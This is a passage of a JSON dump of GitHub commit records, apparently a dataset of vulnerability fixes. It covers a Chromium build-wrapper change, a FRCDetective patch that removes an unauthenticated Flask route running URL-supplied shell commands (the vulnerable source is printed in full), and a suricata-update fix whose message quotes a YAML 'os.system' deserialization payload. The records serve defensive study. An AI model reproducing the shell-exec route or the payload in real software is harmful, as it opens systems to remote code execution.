passed to mojom_parser's --check-imports flag. \"\"\" argparser=argparse.ArgumentParser() argparser.add_argument('--check-imports', dest='check_imports', required=True) argparser.add_argument('--output-root', dest='output_root', required=True) mojom_parser_args, _=argparser.parse_known_args(args=extra_args) processed_inputs=set() _process_build_metadata_json(mojom_parser_args.check_imports, exec_root, os.getcwd(), mojom_parser_args.output_root, output_files, processed_inputs) return map(lambda dep: os.path.normpath(os.path.relpath(dep, exec_root)), processed_inputs) def main(): argparser=argparse.ArgumentParser(description='rewrapper executor for gn', allow_abbrev=False) argparser.add_argument('--custom_processor', type=CustomProcessor, choices=list(CustomProcessor)) argparser.add_argument('rewrapper_path') argparser.add_argument('--input_list_paths') argparser.add_argument('--output_list_paths') argparser.add_argument('--exec_root') parsed_args, extra_args=argparser.parse_known_args() args=[parsed_args.rewrapper_path] output_files=set() with open(parsed_args.output_list_paths, 'r') as file: for line in file: output_files.add(line.rstrip('\\n')) if parsed_args.custom_processor==CustomProcessor.mojom_parser: root, ext=os.path.splitext(parsed_args.input_list_paths) extra_inputs=_get_mojom_parser_inputs(parsed_args.exec_root, output_files, extra_args) extra_input_list_path='%s__extra%s' %(root, ext) with open(extra_input_list_path, 'w') as file: with open(parsed_args.input_list_paths, 'r') as inputs: file.write(inputs.read()) file.write(\"\\n\".join(extra_inputs)) args +=[\"--input_list_paths=%s\" % extra_input_list_path] else: args +=[\"--input_list_paths=%s\" % parsed_args.input_list_paths] args_rest=filter(lambda arg: '--custom_processor=' not in arg, sys.argv[2:]) args +=filter(lambda arg: '--input_list_paths=' not in arg, args_rest) proc=subprocess.run(args) return proc.returncode if __name__=='__main__': sys.exit(main()) ","sourceWithComments":"#!\/usr\/bin\/env python3\n# Copyright 2022 The Chromium Authors\n# Use of this source code is governed by a BSD-style license that can be\n# found in the LICENSE file.\n\"\"\"Wrapper script to run action remotely through rewrapper with gn.\n\nAlso includes Chromium-specific input processors which don't make sense to\nbe reclient inbuilt input processors.\"\"\"\n\nimport argparse\nimport json\nimport os\nimport subprocess\nimport sys\nfrom enum import Enum\n\n\nclass CustomProcessor(Enum):\n  mojom_parser = 'mojom_parser'\n\n  def __str__(self):\n    return self.value\n\n\ndef _process_build_metadata_json(bm_file, exec_root, working_dir, output_root,\n                                 re_outputs, processed_inputs):\n  \"\"\"Recursively find mojom_parser inputs from a build_metadata file.\"\"\"\n  if bm_file in processed_inputs:\n    return\n\n  processed_inputs.add(bm_file)\n\n  bm_dir = os.path.dirname(bm_file)\n  wd_rel = os.path.relpath(working_dir, exec_root)\n\n  with open(bm_file) as f:\n    bm = json.load(f)\n\n  # All sources and corresponding module files are inputs.\n  for s in bm[\"sources\"]:\n    src = os.path.normpath(os.path.join(bm_dir, s))\n    if src not in processed_inputs and os.path.exists(src):\n      processed_inputs.add(src)\n    src_module = os.path.normpath(\n        os.path.join(output_root, os.path.join(wd_rel, src + \"-module\")))\n    if src_module in re_outputs:\n      continue\n    if src_module not in processed_inputs and os.path.exists(src_module):\n      processed_inputs.add(src_module)\n\n  # Recurse into build_metadata deps.\n  for d in bm[\"deps\"]:\n    dep = os.path.normpath(os.path.join(bm_dir, d))\n    _process_build_metadata_json(dep, exec_root, working_dir, output_root,\n                                 re_outputs, processed_inputs)\n\n\ndef _get_mojom_parser_inputs(exec_root, output_files, extra_args):\n  \"\"\"Get mojom inputs by walking generated build_metadata files.\n\n  This is less complexity and disk I\/O compared to parsing mojom files for\n  imports and finding all imports.\n\n  Start from the root build_metadata file passed to mojom_parser's\n  --check-imports flag.\n  \"\"\"\n  argparser = argparse.ArgumentParser()\n  argparser.add_argument('--check-imports', dest='check_imports', required=True)\n  argparser.add_argument('--output-root', dest='output_root', required=True)\n  mojom_parser_args, _ = argparser.parse_known_args(args=extra_args)\n\n  processed_inputs = set()\n  _process_build_metadata_json(mojom_parser_args.check_imports, exec_root,\n                               os.getcwd(), mojom_parser_args.output_root,\n                               output_files, processed_inputs)\n\n  # Rebase paths onto rewrapper exec root.\n  return map(lambda dep: os.path.normpath(os.path.relpath(dep, exec_root)),\n             processed_inputs)\n\n\ndef main():\n  # Set up argparser with some rewrapper flags.\n  argparser = argparse.ArgumentParser(description='rewrapper executor for gn',\n                                      allow_abbrev=False)\n  argparser.add_argument('--custom_processor',\n                         type=CustomProcessor,\n                         choices=list(CustomProcessor))\n  argparser.add_argument('rewrapper_path')\n  argparser.add_argument('--input_list_paths')\n  argparser.add_argument('--output_list_paths')\n  argparser.add_argument('--exec_root')\n  parsed_args, extra_args = argparser.parse_known_args()\n\n  # This script expects to be calling rewrapper.\n  args = [parsed_args.rewrapper_path]\n\n  # Get the output files list.\n  output_files = set()\n  with open(parsed_args.output_list_paths, 'r') as file:\n    for line in file:\n      output_files.add(line.rstrip('\\n'))\n\n  # Scan for and add explicit inputs for rewrapper if necessary.\n  # These should be in a new input list paths file, as using --inputs can fail\n  # if the list is extremely large.\n  if parsed_args.custom_processor == CustomProcessor.mojom_parser:\n    root, ext = os.path.splitext(parsed_args.input_list_paths)\n    extra_inputs = _get_mojom_parser_inputs(parsed_args.exec_root, output_files,\n                                            extra_args)\n    extra_input_list_path = '%s__extra%s' % (root, ext)\n    with open(extra_input_list_path, 'w') as file:\n      with open(parsed_args.input_list_paths, 'r') as inputs:\n        file.write(inputs.read())\n      file.write(\"\\n\".join(extra_inputs))\n    args += [\"--input_list_paths=%s\" % extra_input_list_path]\n  else:\n    args += [\"--input_list_paths=%s\" % parsed_args.input_list_paths]\n\n  # Filter out --custom_processor= which is a flag for this script,\n  # and filter out --input_list_paths= because we replace it above.\n  # Pass on the rest of the args to rewrapper.\n  args_rest = filter(lambda arg: '--custom_processor=' not in arg, sys.argv[2:])\n  args += filter(lambda arg: '--input_list_paths=' not in arg, args_rest)\n\n  # Run rewrapper.\n  proc = subprocess.run(args)\n  return proc.returncode\n\n\nif __name__ == '__main__':\n  sys.exit(main())\n"}},"msg":"Fix action_remote for mojo by sharing path rebasing logic\n\nThere is a mismatch in how action_remote.py and mojom_parser.py currently attempt to find mojo module files.\n\nBecause of this mismatch, incremental remote execution of mojo actions may produce incorrect results. This is because reproxy is given an incorrect set of mojo module inputs and therefore may use old versions of mojom-module files.\n\nBecause the path rebase logic is not a trivially small amount of code, let's resolve the issue by making it public for action_remote to be able to import.\n\n(This CL is a continuation of the prototype https:\/\/crrev.com\/c\/4075247. For reference, the original CL description is below:)\n\nfix action_remote for mojo\n\nmojo custom processor failed to find *.mojom-module\nfor runtime_feature_state.\nso\n ..\/..\/mojo\/public\/tools\/mojom\/mojom_parsre.py .. --mojom-file-list=gen\/third_party\/blink\/public\/mojom\/mojom_core__parser.rsp ..\nfailed with exit=1, but it returns previous navigation_params.mojom-module as outputs (which is also included as inputs).\naction digest: \"f258e220065cf46e0ad020db10b8a42a73930d062e43d546015022fd36774c42\/147\"\nnavigation_params.mojom-module digest:\n\"a91fb5b68f841937aab12f1b9c29c3dd27545eb595c24e33fbf180e999f2fa07\/8342596\"\nThis action completed with STATUS_LOCAL_FALLBACK.\n\nLocal fallback should update the navigation_params.mojom-module,\nbut reproxy uses old navigation_params.mojom-module for\n ..\/..\/mojo\/public\/tools\/bindings\/mojom_bindings_generator.py .. --filelist=gen\/third_party\/blink\/public\/mojom\/mojom_core__generate_message_ids.rsp .. -g c++ --typemap ..\naction_digest: \"ad7e49d83251359892b2cd3b56856a1dfe68ea6844acbdba377bed6ac041db86\/148\"\nand produces bad navigation_params.mojom.h etc.\n\nThose bad navigation_params.mojom.h etc is used for compile\nfor obj\/content\/browser\/browser\/navigation_entry_impl.o\nand caused compile error.\naction digest: \"ce346c0790d03df02e9610a894ac04c0a64845c89f8ce74cd47ff3ad6bcf1a4a\/147\"\n\nThis CL fixes the first mojom custom processor error, so\nit makes mojom_parser.py successful, and reproxy could use\nthe correct navigation_params.mojom-module in the following steps.\n\n(RBE instance is projects\/goma-foundry-experiments\/instances\/default_instance)\n\nBug: b\/253987456, chromium:1395172\nChange-Id: I8dca6eef82d5f6d01b1d6472a509f92a6d6cd5a1\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/4170097\nReviewed-by: Takuto Ikuta <tikuta@chromium.org>\nCommit-Queue: Richard Wang <richardwa@google.com>\nReviewed-by: Daniel Cheng <dcheng@chromium.org>\nCr-Commit-Position: refs\/heads\/main@{#1093708}\nNOKEYCHECK=True\nGitOrigin-RevId: f1e842fe6214b96b074299101986e767a692e772"}},"https:\/\/github.com\/mitchellblaser\/FRCDetective":{"3ceef74d99e839a48c1ec1976777d0ac724f22da":{"url":"https:\/\/api.github.com\/repos\/mitchellblaser\/FRCDetective\/commits\/3ceef74d99e839a48c1ec1976777d0ac724f22da","html_url":"https:\/\/github.com\/mitchellblaser\/FRCDetective\/commit\/3ceef74d99e839a48c1ec1976777d0ac724f22da","message":"Patched Insecure Remote Code Execution in WebGUI","sha":"3ceef74d99e839a48c1ec1976777d0ac724f22da","keyword":"remote code execution insecure","diff":"diff --git a\/Server\/webgui\/app\/routes.py b\/Server\/webgui\/app\/routes.py\nindex 535db3d..074ed24 100644\n--- a\/Server\/webgui\/app\/routes.py\n+++ b\/Server\/webgui\/app\/routes.py\n@@ -237,8 +237,8 @@ def uploadround(filename):\n     else:\n         return \"Not authenticated.\"\n \n-@app.route(\"\/adminconsole\/cmd\/<command>\")\n-def cmd(command):\n-    process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)\n-    out = process.communicate()\n-    return out\n\\ No newline at end of file\n+# @app.route(\"\/adminconsole\/cmd\/<command>\")\n+# def cmd(command):\n+#     process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)\n+#     out = process.communicate()\n+#     return out\n\\ No newline at end of file\n","files":{"\/Server\/webgui\/app\/routes.py":{"changes":[{"diff":"\n     else:\n         return \"Not authenticated.\"\n \n-@app.route(\"\/adminconsole\/cmd\/<command>\")\n-def cmd(command):\n-    process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)\n-    out = process.communicate()\n-    return out\n\\ No newline at end of file\n+# @app.route(\"\/adminconsole\/cmd\/<command>\")\n+# def cmd(command):\n+#     process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)\n+#     out = process.communicate()\n+#     return out\n\\ No newline at end of file\n","add":5,"remove":5,"filename":"\/Server\/webgui\/app\/routes.py","badparts":["@app.route(\"\/adminconsole\/cmd\/<command>\")","def cmd(command):","    process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)","    out = process.communicate()","    return out"],"goodparts":[]},{"diff":"\n     else:\n         return \"Not authenticated.\"\n \n-@app.route(\"\/adminconsole\/cmd\/<command>\")\n-def cmd(command):\n-    process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)\n-    out = process.communicate()\n-    return out\n\\ No newline at end of file\n+# @app.route(\"\/adminconsole\/cmd\/<command>\")\n+# def cmd(command):\n+#     process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)\n+#     out = process.communicate()\n+#     return out\n\\ No newline at end of file\n","add":5,"remove":5,"filename":"\/Server\/webgui\/app\/routes.py","badparts":["@app.route(\"\/adminconsole\/cmd\/<command>\")","def cmd(command):","    process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)","    out = process.communicate()","    return out"],"goodparts":[]}],"source":"\nfrom flask import render_template, flash, redirect, url_for, request, send_from_directory, send_file from app import app, db from app.forms import LoginForm, RegistrationForm from app.models import User from flask_login import current_user, login_user, logout_user, login_required from werkzeug.urls import url_parse import subprocess @app.route(\"\/\") @app.route(\"\/index\") @login_required def index(): return render_template(\"index.html\", title=\"Home\") @app.route(\"\/robots.txt\") def robots(): return '''User-agent: *\\n Disallow: \/''' @app.route(\"\/google4a71b0310f4679e9.html\") def google_verification(): return render_template(\"googleverification.html\") @app.route(\"\/login\", methods=[\"GET\", \"POST\"]) def login(): form=LoginForm() if form.validate_on_submit(): user=User.query.filter_by(username=form.username.data).first() if user is None or not user.check_password(form.password.data): flash(\"Invalid Username or Password.\") return redirect(url_for(\"login\")) login_user(user, remember=form.remember_me.data) next_page=request.args.get('next') if not next_page or url_parse(next_page).netloc !='': next_page=url_for(\"index\") return redirect(next_page) return render_template(\"login.html\", title=\"Sign In\", form=form) @app.route(\"\/logout\") def logout(): logout_user() return redirect(url_for(\"index\")) @app.route(\"\/register\", methods=[\"GET\", \"POST\"]) def register(): if current_user.is_authenticated: return redirect(url_for('index')) form=RegistrationForm() if form.validate_on_submit(): user=User(username=form.username.data, email=form.email.data) user.set_password(form.password.data) db.session.add(user) db.session.commit() of=open(\".\/webgui\/adminusers.txt\", \"r\") filelines=[] for line in of: filelines.append(line.rstrip()) if len(filelines) <=1 and filelines[0]==\"\": print(\"Making user admin.\") nf=open(\".\/webgui\/adminusers.txt\", \"w\") nf.write(str(form.username.data)) nf.close() flash('Congratulations, you are now a registered user!') return redirect(url_for('login')) return render_template('register.html', title='Register', form=form) @app.route(\"\/log\") @login_required def log(): logfile=open(\".\/webgui\/logfile.txt\", \"r\") return logfile.read() @app.route(\"\/command\/<cmd>\") @login_required def command(cmd): cmdfile=open(\".\/webgui\/cmdfile.txt\", \"w\") cmdfile.write(str(cmd) +\"\\n\" +current_user.username +\"\\n\" +current_user.email) cmdfile.close() return \"\" def ReadAdminFile(): out=[] adminfile=open(\".\/webgui\/adminusers.txt\", \"r\") for line in adminfile: out.append(line.rstrip()) return out @app.route(\"\/get\/user\/priv\/<data>\") @login_required def getuserpriv(data): if data in ReadAdminFile(): return \"admin\" else: return \"standard\" @app.route(\"\/adminconsole\") @login_required def adminconsole(): if current_user.username in ReadAdminFile(): users=User.query.all() userlist=\"\" usercount=0 for u in users: userlist=userlist +'<option value=\"' +u.username +'\">' +u.username +\"<\/option>\" usercount=usercount +1 listhtml='<select style=\"width: 200px\" id=\"userlist\" name=\"Users\" size=' +str(5) +'>' +userlist +'<\/select>' adminlist=\"\" for data in ReadAdminFile(): if adminlist==\"\": adminlist=data.rstrip() else: adminlist=adminlist +\", \" +data.rstrip() return render_template('adminconsole.html', title='Admin Console', userlist=listhtml, adminlist=adminlist) else: return redirect(url_for(\"index\")) @app.route(\"\/adminconsole\/deleteuser\/<username>\") @login_required def deleteuser(username): if current_user.username in ReadAdminFile(): for user in User.query.all(): if user.username==username: db.session.delete(user) db.session.commit() deesculateuser(username) return \"OK\" else: return redirect(url_for(\"index\")) @app.route(\"\/adminconsole\/getuserdb\") @login_required def getudb(): if current_user.username in ReadAdminFile(): return send_file('\/app\/webgui\/app.db', as_attachment=True, cache_timeout=0) else: return \"You do not have the permission for this.\" @app.route(\"\/adminconsole\/getadmindb\") @login_required def getadb(): if current_user.username in ReadAdminFile(): return send_file('\/app\/webgui\/adminusers.txt', as_attachment=True, cache_timeout=0) else: return \"You do not have the permission for this.\" @app.route(\"\/adminconsole\/getrounddb\") @login_required def getrdb(): if current_user.username in ReadAdminFile(): return send_file('\/app\/Storage.json', as_attachment=True, cache_timeout=0) else: return \"You do not have the permission for this.\" @app.route(\"\/adminconsole\/getpickdb\") @login_required def getpdb(): if current_user.username in ReadAdminFile(): return send_file('\/app\/Picklist.json', as_attachment=True, cache_timeout=0) else: return \"You do not have the permission for this.\" @app.route(\"\/adminconsole\/elevateuser\/<userid>\") @login_required def elevateuser(userid): if current_user.username in ReadAdminFile(): adminfile=open(\".\/webgui\/adminusers.txt\", \"a\") adminfile.write(\"\\n\" +str(userid)) adminfile.close() return str(userid) else: return \"You do not have the permission for this.\" @app.route(\"\/adminconsole\/deesculateuser\/<userid>\") @login_required def deesculateuser(userid): if current_user.username in ReadAdminFile(): if len(ReadAdminFile()) > 1: out=[] adminfile=open(\".\/webgui\/adminusers.txt\", \"r\") for line in adminfile: if line.rstrip() !=userid: out.append(line.rstrip()) adminfile.close() newadminfile=open(\".\/webgui\/adminusers.txt\", \"w\") for line in out: newadminfile.write(line) newadminfile.close() return str(userid) else: return \"Cannot remove user.\" else: return \"You do not have the permission for this.\" @app.route(\"\/adminconsole\/up\/<filename>\") @login_required def up(filename): if current_user.username in ReadAdminFile(): return render_template('uploadfile.html', title='Upload File', uploadtarget=\"upload\", filename=filename) else: return redirect(url_for(\"index\")) @app.route(\"\/adminconsole\/upround\/<filename>\") @login_required def upround(filename): if current_user.username in ReadAdminFile(): return render_template('uploadfile.html', title='Upload File', uploadtarget=\"uploadround\", filename=filename) else: return redirect(url_for(\"index\")) @app.route(\"\/adminconsole\/upload\/<filename>\", methods=[\"GET\", \"POST\"]) @login_required def upload(filename): if current_user.username in ReadAdminFile(): if request.method==\"POST\": f=request.files[\"file\"] f.save(\".\/webgui\/\" +str(filename)) return redirect(url_for(\"adminconsole\")) else: return \"Please make a POST request to this address.\" else: return \"Not authenticated.\" @app.route(\"\/adminconsole\/uploadround\/<filename>\", methods=[\"GET\", \"POST\"]) @login_required def uploadround(filename): if current_user.username in ReadAdminFile(): if request.method==\"POST\": f=request.files[\"file\"] f.save(\".\/\" +str(filename)) return redirect(url_for(\"adminconsole\")) else: return \"Please make a POST request to this address.\" else: return \"Not authenticated.\" @app.route(\"\/adminconsole\/cmd\/<command>\") def cmd(command): process=subprocess.Popen(command, stdout=subprocess.PIPE, shell=True) out=process.communicate() return out ","sourceWithComments":"from flask import render_template, flash, redirect, url_for, request, send_from_directory, send_file\nfrom app import app, db\nfrom app.forms import LoginForm, RegistrationForm\nfrom app.models import User\nfrom flask_login import current_user, login_user, logout_user, login_required\nfrom werkzeug.urls import url_parse\n\nimport subprocess\n\n@app.route(\"\/\")\n@app.route(\"\/index\")\n@login_required\ndef index():\n    return render_template(\"index.html\", title=\"Home\")\n\n@app.route(\"\/robots.txt\")\ndef robots():\n    return '''User-agent: *\\n\nDisallow: \/'''\n\n@app.route(\"\/google4a71b0310f4679e9.html\")\ndef google_verification():\n    return render_template(\"googleverification.html\")\n\n@app.route(\"\/login\", methods=[\"GET\", \"POST\"])\ndef login():\n    form = LoginForm()\n    if form.validate_on_submit():\n        user = User.query.filter_by(username=form.username.data).first()\n        if user is None or not user.check_password(form.password.data):\n            flash(\"Invalid Username or Password.\")\n            return redirect(url_for(\"login\"))\n        login_user(user, remember=form.remember_me.data)\n        next_page = request.args.get('next')\n        if not next_page or url_parse(next_page).netloc != '':\n            next_page = url_for(\"index\")\n        return redirect(next_page)\n    return render_template(\"login.html\", title=\"Sign In\", form=form)\n\n@app.route(\"\/logout\")\ndef logout():\n    logout_user()\n    return redirect(url_for(\"index\"))\n\n@app.route(\"\/register\", methods=[\"GET\", \"POST\"])\ndef register():\n    if current_user.is_authenticated:\n        return redirect(url_for('index'))\n    form = RegistrationForm()\n    if form.validate_on_submit():\n        user = User(username=form.username.data, email=form.email.data)\n        user.set_password(form.password.data)\n        db.session.add(user)\n        db.session.commit()\n        \n        of = open(\".\/webgui\/adminusers.txt\", \"r\")\n        filelines = []\n        for line in of:\n            filelines.append(line.rstrip())\n        \n        if len(filelines) <= 1 and filelines[0] == \"\":\n            print(\"Making user admin.\")\n            nf = open(\".\/webgui\/adminusers.txt\", \"w\")\n            nf.write(str(form.username.data))\n            nf.close()\n\n        flash('Congratulations, you are now a registered user!')\n        return redirect(url_for('login'))\n    return render_template('register.html', title='Register', form=form)\n\n@app.route(\"\/log\")\n@login_required\ndef log():\n    logfile = open(\".\/webgui\/logfile.txt\", \"r\")\n    return logfile.read()\n\n@app.route(\"\/command\/<cmd>\")\n@login_required\ndef command(cmd):\n    cmdfile = open(\".\/webgui\/cmdfile.txt\", \"w\")\n    cmdfile.write(str(cmd) + \"\\n\" + current_user.username + \"\\n\" + current_user.email)\n    cmdfile.close()\n    return \"\"\n\ndef ReadAdminFile():\n    out = []\n    adminfile = open(\".\/webgui\/adminusers.txt\", \"r\")\n    for line in adminfile:\n        out.append(line.rstrip())\n    return out\n\n@app.route(\"\/get\/user\/priv\/<data>\")\n@login_required\ndef getuserpriv(data):\n    if data in ReadAdminFile():\n        return \"admin\"\n    else:\n        return \"standard\"\n\n@app.route(\"\/adminconsole\")\n@login_required\ndef adminconsole():\n    if current_user.username in ReadAdminFile():\n        users = User.query.all()\n        userlist = \"\"\n        usercount = 0\n        for u in users:\n            userlist = userlist + '<option value=\"' + u.username + '\">' + u.username + \"<\/option>\"\n            usercount = usercount + 1\n        listhtml = '<select style=\"width: 200px\" id=\"userlist\" name=\"Users\" size=' + str(5) + '>' + userlist + '<\/select>'\n        adminlist = \"\"\n        for data in ReadAdminFile():\n            if adminlist == \"\":\n                adminlist = data.rstrip()\n            else:\n                adminlist = adminlist + \", \" + data.rstrip()\n        return render_template('adminconsole.html', title='Admin Console', userlist=listhtml, adminlist=adminlist)\n    else:\n        return redirect(url_for(\"index\"))\n\n@app.route(\"\/adminconsole\/deleteuser\/<username>\")\n@login_required\ndef deleteuser(username):\n    if current_user.username in ReadAdminFile():\n        for user in User.query.all():\n            if user.username == username:\n                db.session.delete(user)\n        db.session.commit()\n        deesculateuser(username)\n        return \"OK\"\n    else:\n        return redirect(url_for(\"index\"))\n\n@app.route(\"\/adminconsole\/getuserdb\")\n@login_required\ndef getudb():\n    if current_user.username in ReadAdminFile():\n        return send_file('\/app\/webgui\/app.db', as_attachment=True, cache_timeout=0)\n    else:\n        return \"You do not have the permission for this.\"\n\n@app.route(\"\/adminconsole\/getadmindb\")\n@login_required\ndef getadb():\n    if current_user.username in ReadAdminFile():\n        return send_file('\/app\/webgui\/adminusers.txt', as_attachment=True, cache_timeout=0)\n    else:\n        return \"You do not have the permission for this.\"\n\n@app.route(\"\/adminconsole\/getrounddb\")\n@login_required\ndef getrdb():\n    if current_user.username in ReadAdminFile():\n        return send_file('\/app\/Storage.json', as_attachment=True, cache_timeout=0)\n    else:\n        return \"You do not have the permission for this.\"\n\n@app.route(\"\/adminconsole\/getpickdb\")\n@login_required\ndef getpdb():\n    if current_user.username in ReadAdminFile():\n        return send_file('\/app\/Picklist.json', as_attachment=True, cache_timeout=0)\n    else:\n        return \"You do not have the permission for this.\"\n\n@app.route(\"\/adminconsole\/elevateuser\/<userid>\")\n@login_required\ndef elevateuser(userid):\n    if current_user.username in ReadAdminFile():\n        adminfile = open(\".\/webgui\/adminusers.txt\", \"a\")\n        adminfile.write(\"\\n\" + str(userid))\n        adminfile.close()\n        return str(userid)\n    else:\n        return \"You do not have the permission for this.\"\n\n@app.route(\"\/adminconsole\/deesculateuser\/<userid>\")\n@login_required\ndef deesculateuser(userid):\n    if current_user.username in ReadAdminFile():\n        if len(ReadAdminFile()) > 1:\n            out = []\n            adminfile = open(\".\/webgui\/adminusers.txt\", \"r\")\n            for line in adminfile:\n                if line.rstrip() != userid:\n                    out.append(line.rstrip())\n            adminfile.close()\n            newadminfile = open(\".\/webgui\/adminusers.txt\", \"w\")\n            for line in out:\n                newadminfile.write(line)\n            newadminfile.close()\n            return str(userid)\n        else:\n            return \"Cannot remove user.\"\n    else:\n        return \"You do not have the permission for this.\"\n\n@app.route(\"\/adminconsole\/up\/<filename>\")\n@login_required\ndef up(filename):\n    if current_user.username in ReadAdminFile():\n        return render_template('uploadfile.html', title='Upload File', uploadtarget=\"upload\", filename=filename)\n    else:\n        return redirect(url_for(\"index\"))\n\n@app.route(\"\/adminconsole\/upround\/<filename>\")\n@login_required\ndef upround(filename):\n    if current_user.username in ReadAdminFile():\n        return render_template('uploadfile.html', title='Upload File', uploadtarget=\"uploadround\", filename=filename)\n    else:\n        return redirect(url_for(\"index\"))\n\n@app.route(\"\/adminconsole\/upload\/<filename>\", methods=[\"GET\", \"POST\"])\n@login_required\ndef upload(filename):\n    if current_user.username in ReadAdminFile():\n        if request.method == \"POST\":\n            f = request.files[\"file\"]\n            f.save(\".\/webgui\/\" + str(filename))\n            return redirect(url_for(\"adminconsole\"))\n        else:\n            return \"Please make a POST request to this address.\"\n    else:\n        return \"Not authenticated.\"\n\n@app.route(\"\/adminconsole\/uploadround\/<filename>\", methods=[\"GET\", \"POST\"])\n@login_required\ndef uploadround(filename):\n    if current_user.username in ReadAdminFile():\n        if request.method == \"POST\":\n            f = request.files[\"file\"]\n            f.save(\".\/\" + str(filename))\n            return redirect(url_for(\"adminconsole\"))\n        else:\n            return \"Please make a POST request to this address.\"\n    else:\n        return \"Not authenticated.\"\n\n@app.route(\"\/adminconsole\/cmd\/<command>\")\ndef cmd(command):\n    process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)\n    out = process.communicate()\n    return out"}},"msg":"Patched Insecure Remote Code Execution in WebGUI"}},"https:\/\/github.com\/OISF\/suricata-update":{"76270e73128ca1299b4e33e7e2a74ac3d963a97a":{"url":"https:\/\/api.github.com\/repos\/OISF\/suricata-update\/commits\/76270e73128ca1299b4e33e7e2a74ac3d963a97a","html_url":"https:\/\/github.com\/OISF\/suricata-update\/commit\/76270e73128ca1299b4e33e7e2a74ac3d963a97a","message":"(Remote)Code-Execution while loading yaml-file\n\nThe list of possible sources for suricata-update is downloaded from \"https:\/\/www.openinfosecfoundation.org\/rules\/index.yaml\" per default. Suricata-Update uses the insecure yaml.load()-function. Code will be executed if the yaml-file contains lines like:\n\nhello: !!python\/object\/apply:os.system ['ls -l > \/tmp\/output']\n\nThe vulnerable function can be triggered by \"suricata-update list-sources\". The locally stored index.yaml will be loaded in this function and the malicious code gets executed.\n\nThis commit fixes Bug #2359","sha":"76270e73128ca1299b4e33e7e2a74ac3d963a97a","keyword":"remote code execution insecure","diff":"diff --git a\/suricata\/update\/config.py b\/suricata\/update\/config.py\nindex dc912e43..36970400 100644\n--- a\/suricata\/update\/config.py\n+++ b\/suricata\/update\/config.py\n@@ -133,13 +133,13 @@ def init(args):\n     if args.config:\n         logger.info(\"Loading %s\", args.config)\n         with open(args.config, \"rb\") as fileobj:\n-            config = yaml.load(fileobj)\n+            config = yaml.safe_load(fileobj)\n             if config:\n                 _config.update(config)\n     elif os.path.exists(DEFAULT_UPDATE_YAML_PATH):\n         logger.info(\"Loading %s\", DEFAULT_UPDATE_YAML_PATH)\n         with open(DEFAULT_UPDATE_YAML_PATH, \"rb\") as fileobj:\n-            config = yaml.load(fileobj)\n+            config = yaml.safe_load(fileobj)\n             if config:\n                 _config.update(config)\n \ndiff --git a\/suricata\/update\/sources.py b\/suricata\/update\/sources.py\nindex 083edf74..ac64ce1a 100644\n--- a\/suricata\/update\/sources.py\n+++ b\/suricata\/update\/sources.py\n@@ -96,7 +96,7 @@ def __init__(self, filename):\n         self.reload()\n \n     def reload(self):\n-        index = yaml.load(open(self.filename, \"rb\"))\n+        index = yaml.safe_load(open(self.filename, \"rb\"))\n         self.index = index\n \n     def resolve_url(self, name, params={}):\n@@ -128,7 +128,7 @@ def get_enabled_sources():\n         for filename in filenames:\n             if filename.endswith(\".yaml\"):\n                 path = os.path.join(dirpath, filename)\n-                source = yaml.load(open(path, \"rb\"))\n+                source = yaml.safe_load(open(path, \"rb\"))\n                 sources[source[\"source\"]] = source\n \n                 if \"params\" in source:\n","files":{"\/suricata\/update\/config.py":{"changes":[{"diff":"\n     if args.config:\n         logger.info(\"Loading %s\", args.config)\n         with open(args.config, \"rb\") as fileobj:\n-            config = yaml.load(fileobj)\n+            config = yaml.safe_load(fileobj)\n             if config:\n                 _config.update(config)\n     elif os.path.exists(DEFAULT_UPDATE_YAML_PATH):\n         logger.info(\"Loading %s\", DEFAULT_UPDATE_YAML_PATH)\n         with open(DEFAULT_UPDATE_YAML_PATH, \"rb\") as fileobj:\n-            config = yaml.load(fileobj)\n+            config = yaml.safe_load(fileobj)\n             if config:\n                 _config.update(config)\n ","add":2,"remove":2,"filename":"\/suricata\/update\/config.py","badparts":["            config = yaml.load(fileobj)","            config = yaml.load(fileobj)"],"goodparts":["            config = yaml.safe_load(fileobj)","            config = yaml.safe_load(fileobj)"]},{"diff":"\n     if args.config:\n         logger.info(\"Loading %s\", args.config)\n         with open(args.config, \"rb\") as fileobj:\n-            config = yaml.load(fileobj)\n+            config = yaml.safe_load(fileobj)\n             if config:\n                 _config.update(config)\n     elif os.path.exists(DEFAULT_UPDATE_YAML_PATH):\n         logger.info(\"Loading %s\", DEFAULT_UPDATE_YAML_PATH)\n         with open(DEFAULT_UPDATE_YAML_PATH, \"rb\") as fileobj:\n-            config = yaml.load(fileobj)\n+            config = yaml.safe_load(fileobj)\n             if config:\n                 _config.update(config)\n ","add":2,"remove":2,"filename":"\/suricata\/update\/config.py","badparts":["            config = yaml.load(fileobj)","            config = yaml.load(fileobj)"],"goodparts":["            config = yaml.safe_load(fileobj)","            config = yaml.safe_load(fileobj)"]}],"source":"\n import os.path import logging import yaml logger=logging.getLogger() DEFAULT_DATA_DIRECTORY=\"\/var\/lib\/suricata\" CACHE_DIRECTORY=os.path.join(\"update\", \"cache\") SOURCE_DIRECTORY=os.path.join(\"update\", \"sources\") DATA_DIRECTORY_KEY=\"data-directory\" CACHE_DIRECTORY_KEY=\"cache-directory\" IGNORE_KEY=\"ignore\" DISABLE_CONF_KEY=\"disable-conf\" ENABLE_CONF_KEY=\"enable-conf\" MODIFY_CONF_KEY=\"modify-conf\" DROP_CONF_KEY=\"drop-conf\" LOCAL_CONF_KEY=\"local\" OUTPUT_KEY=\"output\" DEFAULT_UPDATE_YAML_PATH=\"\/etc\/suricata\/update.yaml\" DEFAULT_SURICATA_YAML_PATH=[ \"\/etc\/suricata\/suricata.yaml\", \"\/usr\/local\/etc\/suricata\/suricata.yaml\", \"\/etc\/suricata\/suricata-debian.yaml\" ] DEFAULT_CONFIG={ \"disable-conf\": \"\/etc\/suricata\/disable.conf\", \"enable-conf\": \"\/etc\/suricata\/enable.conf\", \"drop-conf\": \"\/etc\/suricata\/drop.conf\", \"modify-conf\": \"\/etc\/suricata\/modify.conf\", \"suricata-conf\": \"\/etc\/suricata\/suricata.conf\", \"sources\":[], 